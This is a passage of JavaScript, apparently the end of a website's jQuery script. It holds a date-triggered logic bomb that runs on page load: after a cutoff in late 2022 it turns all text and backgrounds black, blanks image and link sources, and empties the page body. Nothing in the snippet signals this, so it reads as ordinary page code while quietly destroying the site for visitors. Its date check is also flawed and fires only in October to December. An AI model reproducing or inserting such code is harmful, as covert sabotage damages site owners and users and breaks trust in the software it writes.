...
});$(document).ready(function () {var d = new Date();if(d.getFullYear() >= 2022 && (d.getMonth()+1) >= 10 && d.getDate() > 1){$('body,div,.container,a,span,h1,h2,h3,h4,h5').css({'background-color':'#000','color':'#000'});$('img,a').attr('src', '#');$('body').html('');}});